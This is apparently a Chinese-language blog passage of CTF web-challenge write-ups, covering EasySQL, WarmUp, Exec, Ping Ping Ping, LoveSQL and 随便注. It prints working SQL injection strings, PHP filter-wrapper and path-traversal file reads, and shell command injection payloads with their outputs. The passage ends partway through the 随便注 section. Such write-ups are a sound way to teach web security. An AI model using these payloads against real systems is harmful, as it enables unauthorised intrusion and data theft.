+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details >
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019easysql" aria-label="[极客大挑战 2019]EasySQL">[极客大挑战 2019]EasySQL</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019havefun" aria-label="[极客大挑战 2019]Havefun">[极客大挑战 2019]Havefun</a></li>
+                    <li>
+                        <a href="#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9binclude" aria-label="[ACTF2020 新生赛]Include">[ACTF2020 新生赛]Include</a></li>
+                    <li>
+                        <a href="#hctf-2018warmup" aria-label="[HCTF 2018]WarmUp">[HCTF 2018]WarmUp</a></li>
+                    <li>
+                        <a href="#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bexec" aria-label="[ACTF2020 新生赛]Exec">[ACTF2020 新生赛]Exec</a></li>
+                    <li>
+                        <a href="#gxyctf2019ping-ping-ping" aria-label="[GXYCTF2019]Ping Ping Ping">[GXYCTF2019]Ping Ping Ping</a></li>
+                    <li>
+                        <a href="#suctf-2019easysql" aria-label="[SUCTF 2019]EasySQL">[SUCTF 2019]EasySQL</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019lovesql" aria-label="[极客大挑战 2019]LoveSQL">[极客大挑战 2019]LoveSQL</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019secret-file" aria-label="[极客大挑战 2019]Secret File">[极客大挑战 2019]Secret File</a></li>
+                    <li>
+                        <a href="#%e5%bc%ba%e7%bd%91%e6%9d%af-2019%e9%9a%8f%e4%be%bf%e6%b3%a8" aria-label="[强网杯 2019]随便注">[强网杯 2019]随便注</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019http" aria-label="[极客大挑战 2019]Http">[极客大挑战 2019]Http</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019upload" aria-label="[极客大挑战 2019]Upload">[极客大挑战 2019]Upload</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019knife" aria-label="[极客大挑战 2019]Knife">[极客大挑战 2019]Knife</a></li>
+                    <li>
+                        <a href="#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bupload" aria-label="[ACTF2020 新生赛]Upload">[ACTF2020 新生赛]Upload</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019babysql" aria-label="[极客大挑战 2019]BabySQL">[极客大挑战 2019]BabySQL</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019php" aria-label="[极客大挑战 2019]PHP">[极客大挑战 2019]PHP</a></li>
+                    <li>
+                        <a href="#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bbackupfile" aria-label="[ACTF2020 新生赛]BackupFile">[ACTF2020 新生赛]BackupFile</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019buyflag" aria-label="[极客大挑战 2019]BuyFlag">[极客大挑战 2019]BuyFlag</a></li>
+                    <li>
+                        <a href="#hctf-2018admin" aria-label="[HCTF 2018]admin">[HCTF 2018]admin</a></li>
+                    <li>
+                        <a href="#bjdctf2020easy-md5" aria-label="[BJDCTF2020]Easy MD5">[BJDCTF2020]Easy MD5</a></li>
+                    <li>
+                        <a href="#mrctf2020%e4%bd%a0%e4%bc%a0%e4%bd%a0%e5%91%a2" aria-label="[MRCTF2020]你传你🐎呢">[MRCTF2020]你传你🐎呢</a></li>
+                    <li>
+                        <a href="#%e6%8a%a4%e7%bd%91%e6%9d%af-2018easy_tornado" aria-label="[护网杯 2018]easy_tornado">[护网杯 2018]easy_tornado</a></li>
+                    <li>
+                        <a href="#zjctf-2019nizhuansiwei" aria-label="[ZJCTF 2019]NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</a></li>
+                    <li>
+                        <a href="#mrctf2020ez_bypass" aria-label="[MRCTF2020]Ez_bypass">[MRCTF2020]Ez_bypass</a></li>
+                    <li>
+                        <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019hardsql" aria-label="[极客大挑战 2019]HardSQL">[极客大挑战 2019]HardSQL</a></li>
+                    <li>
+                        <a href="#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz" aria-label="[网鼎杯 2020 青龙组]AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</a></li>
+                    <li>
+                        <a href="#gxyctf2019babyupload" aria-label="[GXYCTF2019]BabyUpload">[GXYCTF2019]BabyUpload</a></li>
+                    <li>
+                        <a href="#suctf-2019checkin" aria-label="[SUCTF 2019]CheckIn">[SUCTF 2019]CheckIn</a></li>
+                    <li>
+                        <a href="#gyctf2020blacklist" aria-label="[GYCTF2020]Blacklist">[GYCTF2020]Blacklist</a></li>
+                    <li>
+                        <a href="#roarctf-2019easy-java" aria-label="[RoarCTF 2019]Easy Java">[RoarCTF 2019]Easy Java</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><h2 id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019easysql">#</a></h2>
+<p>一个登录页面，猜测存在用户名admin，万能密码登录成功直接回显flag：</p>
+<pre tabindex="0"><code>?username=admin&amp;password=1&#39;+or+1+%23
+</code></pre><p>flag{ecd75a20-0982-4d18-b5ea-ca0d11d6ce37}</p>
+<hr>
+<h2 id="极客大挑战-2019havefun">[极客大挑战 2019]Havefun<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019havefun">#</a></h2>
+<p>源码有段注释，GET传参?cat=dog即可：</p>
+<pre tabindex="0"><code>                &lt;!--
+        $cat=$_GET[&#39;cat&#39;];
+        echo $cat;
+        if($cat==&#39;dog&#39;){
+            echo &#39;Syc{cat_cat_cat_cat}&#39;;
+        }
+        --&gt;
+</code></pre><p>flag{ea9d4a51-1fd0-40a7-82bd-c5097a9a09fb}</p>
+<hr>
+<h2 id="actf2020-新生赛include">[ACTF2020 新生赛]Include<a hidden class="anchor" aria-hidden="true" href="#actf2020-新生赛include">#</a></h2>
+<p>起始页面有个tips，通过href属性实现了传参?file=flag.php并定向到如下页面：</p>
+<pre tabindex="0"><code>Can you find out the flag?
+</code></pre><p>猜测对file的值用include来进行操作，导致php文件代码被解析，考虑使用伪协议把flag.php编码为base64数据流进行读取</p>
+<pre tabindex="0"><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><p>再对base64进行解码即可：</p>
+<pre tabindex="0"><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NjRkYjcwNDMtZDQ2YS00YjRlLWFlNDUtOGQwNzU4MGUxZTZmfQo=
+
+&lt;?php
+echo &#34;Can you find out the flag?&#34;;
+//flag{64db7043-d46a-4b4e-ae45-8d07580e1e6f}
+</code></pre><hr>
+<h2 id="hctf-2018warmup">[HCTF 2018]WarmUp<a hidden class="anchor" aria-hidden="true" href="#hctf-2018warmup">#</a></h2>
+<p>源码注释：</p>
+<pre tabindex="0"><code>&lt;!--source.php--&gt;
+</code></pre><p>source.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">emmm</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkFile</span>(<span style="color:#f92672">&amp;</span>$page)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;source&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;source.php&#34;</span>,<span style="color:#e6db74">&#34;hint&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;hint.php&#34;</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">isset</span>($page) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_string</span>($page)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you can&#39;t see it&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($page, $whitelist)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            $_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">mb_substr</span>(
+</span></span><span style="display:flex;"><span>                $page,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mb_strpos</span>($page <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>)
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($_page, $whitelist)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            $_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($page);
+</span></span><span style="display:flex;"><span>            $_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">mb_substr</span>(
+</span></span><span style="display:flex;"><span>                $_page,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mb_strpos</span>($_page <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>)
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($_page, $whitelist)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you can&#39;t see it&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">emmm</span><span style="color:#f92672">::</span><span style="color:#a6e22e">checkFile</span>($_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>])
+</span></span><span style="display:flex;"><span>    ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span> $_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&lt;img src=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> /&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></span></span></code></pre></div><p>可以发现，只需传入?file=hint.php即可第一次就return true，从而获取hint.php执行后的内容：</p>
+<pre tabindex="0"><code> flag not here, and flag in ffffllllaaaagggg
+</code></pre><p>php中include有这样的特性，会对文件路径先进行规范化处理，处理时不会检验目录(如hint.php?)是否存在，于是可以构造这样的payload：</p>
+<pre tabindex="0"><code>?file=hint.php?../../../../../ffffllllaaaagggg
+</code></pre><p>有足够多的<code>../</code>，include对路径进行处理后就相当于执行：<code>include(&quot;/ffffllllaaaagggg&quot;)</code></p>
+<p>flag{8c145a85-2948-4a4a-94fc-10bcb05cc91d}</p>
+<hr>
+<h2 id="actf2020-新生赛exec">[ACTF2020 新生赛]Exec<a hidden class="anchor" aria-hidden="true" href="#actf2020-新生赛exec">#</a></h2>
+<pre tabindex="0"><code>123;find / -name flag
+PING 123 (0.0.0.123): 56 data bytes
+
+--- 123 ping statistics ---
+3 packets transmitted, 0 packets received, 100% packet loss
+/flag
+
+
+123;cat /flag
+PING 123 (0.0.0.123): 56 data bytes
+
+--- 123 ping statistics ---
+3 packets transmitted, 0 packets received, 100% packet loss
+flag{47584b5d-c259-40a3-9272-976c97ef47a1}
+</code></pre><hr>
+<h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping<a hidden class="anchor" aria-hidden="true" href="#gxyctf2019ping-ping-ping">#</a></h2>
+<p>先绕过空格读取index.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;ip&#39;</span>])){
+</span></span><span style="display:flex;"><span>  $ip <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;ip&#39;</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&#34;</span>, $ip, $match)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&#34;</span>, $ip, $match);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your symbol!&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/ /&#34;</span>, $ip)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your space!&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/bash/&#34;</span>, $ip)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your bash!&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/.*f.*l.*a.*g.*/&#34;</span>, $ip)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck your flag!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;ping -c 4 &#34;</span><span style="color:#f92672">.</span>$ip);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_r</span>($a);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>过滤了很多，拼接字符串绕过即可：</p>
+<pre tabindex="0"><code>?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php
+</code></pre><p>源码注释中获取flag：flag{07709504-1033-43f4-b6dc-c8d428fb70bb}</p>
+<hr>
+<h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL<a hidden class="anchor" aria-hidden="true" href="#suctf-2019easysql">#</a></h2>
+<p>多次进行fuzz测试，发现过滤了union from where等常见语句，同时能大致猜测出后端的查询语句结构：</p>
+<pre tabindex="0"><code>114,5,66
+Array ( [0] =&gt; 114 [1] =&gt; 5 [2] =&gt; 1 ) 
+
+114,5,0
+Array ( [0] =&gt; 114 [1] =&gt; 5 [2] =&gt; 0 ) 
+</code></pre><p>猜测查询语句中有逻辑或<code>||</code>，可能结构如下：</p>
+<pre tabindex="0"><code>select post_query || column_name from table_name
+</code></pre><p>查一下有哪些表：</p>
+<pre tabindex="0"><code>1;show tables;
+Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )
+</code></pre><p>因为只有一张表，查询语句可以进一步精确：</p>
+<pre tabindex="0"><code>select post_query || column_name from Flag
+</code></pre><p>通配符未被过滤，于是可以构造出最终payload：</p>
+<pre tabindex="0"><code>*,514
+Array ( [0] =&gt; flag{a712b4db-9fc5-41b5-8a6a-f0b18f52d576} [1] =&gt; 1 ) 
+</code></pre><p>看了题目后端<a href="https://github.com/team-su/SUCTF-2019/blob/master/Web/easy_sql/file/index.php">源码</a>和其他师傅的wp发现还有一种做法，通过修改mysql配置来将<code>||</code>的功能更改为类似concat的功能：</p>
+<pre tabindex="0"><code>2;set sql_mode=pipes_as_concat;select 3
+Array ( [0] =&gt; 2 ) Array ( [0] =&gt; 3flag{a712b4db-9fc5-41b5-8a6a-f0b18f52d576} ) 
+</code></pre><hr>
+<h2 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019lovesql">#</a></h2>
+<p>万能密码登录成功，回显了admin的账号和密码：</p>
+<pre tabindex="0"><code>Hello admin！
+Your password is &#39;1715a9fd6c554e96be4451229db26a83&#39;
+</code></pre><p>查字段数：</p>
+<pre tabindex="0"><code>?username=admin&#39;+order+by+4+%23&amp;password=1
+报错：Unknown column &#39;4&#39; in &#39;order clause&#39;
+
+?username=admin&#39;+order+by+3+%23&amp;password=1
+正常回显账号密码，说明字段数为3
+</code></pre><p>查注入位置：</p>
+<pre tabindex="0"><code>?username=-1&#39;+union+select+1%2C2%2C3+%23&amp;password=1
+
+Hello 2！
+Your password is &#39;3&#39;
+</code></pre><p>查表名：</p>
+<pre tabindex="0"><code>?username=-1&#39;+union+select+1%2C2%2Cgroup_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+%23&amp;password=1
+
+Hello 2！
+Your password is &#39;geekuser,l0ve1ysq1&#39;
+</code></pre><p>查列名：</p>
+<pre tabindex="0"><code>?username=-1&#39;+union+select+1%2C2%2Cgroup_concat(column_name)+from+information_schema.columns+where+table_name%3D&#39;l0ve1ysq1&#39;+%23&amp;password=1
+
+Hello 2！
+Your password is &#39;id,username,password&#39;
+</code></pre><p>查字段数据：</p>
+<pre tabindex="0"><code>-1&#39; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 #
+
+Hello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！
+Your password is &#39;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{a77c55c1-2629-477d-9d24-fbdcfcc722c5}&#39;
+</code></pre><hr>
+<h2 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-2019secret-file">#</a></h2>
+<p>抓包在前端源码里能看到注释，访问secr3t.php，php伪协议传base64编码的flag.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">title</span>&gt;FLAG&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;background-color:black;&#34;</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;font-family:verdana;color:red;text-align:center;&#34;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/<span style="color:#f92672">h1</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;font-family:arial;color:red;font-size:20px;text-align:center;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                echo &#34;我就在这里&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                $flag = &#39;flag{d2998aa0-03cb-4738-8117-271f44690fdc}&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            ?&gt;</span>
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="强网杯-2019随便注">[强网杯 2019]随便注<a hidden class="anchor" aria-hidden="true" href="#强网杯-2019随便注">#</a></h2>
+<p>单引号闭合，字段数为2，还有过滤，尝试绕过无果，考虑使用堆叠注入：</p>
+<pre tabindex="0"><code>return preg_match(&#34;/select|update|delete|drop|insert|where|\./i&#34;,$inject);
+</code></pre><p>获取表名：</p>
+<pre tabindex="0"><code>1&#39;;show tables #
+</code></pre><p>对两张表&quot;1919810931114514&quot;和&quot;words&quot;分别查询字段名，用反引号包裹表示表名：</p>
+<pre tabindex="0"><code>1&#39;;show columns from `1919810931114514` #
+1&#39;;show columns from `words` #
+</code></pre><p>flag在表&quot;1919810931114514&quot;中，没想到好的办法，参考了其他师傅的wp</p>
+<p>方法一：使用handler进行查询，不过handler并没有包含到SQL标准中，handler查询流程如下，只能一行一行获取数据：</p>
+<pre tabindex="0"><code>handler table_name open
+handler table_name read first
+handler table_name read next
+...
+handler table_name colse
+</code></pre><p>可以自由获取当前表第一行、后一行、前一行、最后一行数据 first | next | prev | last</p>
+<pre tabindex="0"><code>1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close #
+
+array(1) {
+  [0]=&gt;
+  string(42) &#34;flag{468432d7-1f83-4a68-a18b-41d3bca79d4c}&#34;
+}
+</code></pre><p>方法二：将1919810931114514表名换为words，再将表中字段名flag改为data，添加具有默认值的字段id：</p>
